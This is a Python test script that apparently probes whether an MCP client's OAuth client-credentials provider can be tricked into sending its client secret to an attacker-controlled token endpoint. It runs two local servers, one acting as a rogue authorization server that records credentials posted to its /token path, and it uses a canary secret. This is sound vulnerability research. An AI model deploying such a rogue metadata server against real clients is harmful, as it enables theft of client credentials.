import asyncio, json, threading, http.server, warnings

SECRET = "CANARY-do-not-leak-001"
HITS = []

class AS(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass
    def reply(self, code, payload):
        raw = json.dumps(payload).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)
    def do_GET(self):
        base = self.server.base_url
        if self.path.startswith("/.well-known/oauth-protected-resource"):
            return self.reply(200, {"resource": base + "/mcp",
                                    "authorization_servers": self.server.advertise})
        if self.path.startswith("/.well-known/oauth-authorization-server"):
            return self.reply(200, {
                "issuer": base,
                "token_endpoint": base + "/token",
                "authorization_endpoint": base + "/authorize",
                "registration_endpoint": base + "/register",
                "response_types_supported": ["code"],
                "grant_types_supported": ["client_credentials"],
            })
        if self.path.startswith("/mcp"):
            self.send_response(401)
            self.send_header("WWW-Authenticate",
                'Bearer resource_metadata="%s/.well-known/oauth-protected-resource"' % base)
            self.send_header("Content-Length", "0")
            self.end_headers()
            return
        self.reply(404, {})
    def do_POST(self):
        n = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(n).decode("utf-8", "replace")
        if self.path.startswith("/token"):
            HITS.append((self.server.name, body))
            return self.reply(401, {"error": "invalid_client"})
        self.reply(404, {})

def start(name):
    s = http.server.HTTPServer(("127.0.0.1", 0), AS)
    s.name = name
    s.base_url = "http://127.0.0.1:%d" % s.server_port
    s.touches = []
    s.advertise = [s.base_url]
    threading.Thread(target=s.serve_forever, daemon=True).start()
    return s

async def one(label, issuer):
    from mcp.client.session import ClientSession
    from mcp.client.streamable_http import streamablehttp_client as streamable_http_client
    from mcp.client.auth.extensions.client_credentials import ClientCredentialsOAuthProvider
    url = ATTACKER.base_url + "/mcp"
    HITS.clear()
    class Store:
        async def get_tokens(self):
            return None
        async def set_tokens(self, tokens):
            return None
        async def get_client_info(self):
            return None
        async def set_client_info(self, info):
            return None
    p = ClientCredentialsOAuthProvider(
        server_url=url, client_id="cid", client_secret=SECRET,
        storage=Store(), issuer=issuer)
    try:
        async with streamable_http_client(url, auth=p) as (r, w, _):
            async with ClientSession(r, w) as s:
                await s.initialize()
    except Exception as e:
        import traceback
        print(label, "flow ended")
        print("".join(traceback.format_exception(e))[-2500:])
    who = [h[0] for h in HITS]
    leaked = any(SECRET in h[1] for h in HITS)
    print(label, "token hits:", who, "secret leaked:", leaked)
    print(label, "legit:", LEGIT.touches)
    print(label, "attacker:", ATTACKER.touches)
    LEGIT.touches.clear(); ATTACKER.touches.clear()

LEGIT = start("legit")
ATTACKER = start("attacker")
ATTACKER.advertise = [ATTACKER.base_url, LEGIT.base_url]
warnings.simplefilter("always", DeprecationWarning)
import urllib.request
def ping(u):
    try:
        urllib.request.urlopen(u, timeout=3)
    except Exception as e:
        return getattr(e, "code", "conn-fail")
print("stub /mcp ->", ping(ATTACKER.base_url + "/mcp"))
print("stub meta ->", ping(ATTACKER.base_url + "/.well-known/oauth-protected-resource"))
asyncio.run(one("no issuer   ", None))
asyncio.run(one("issuer=legit", LEGIT.base_url))
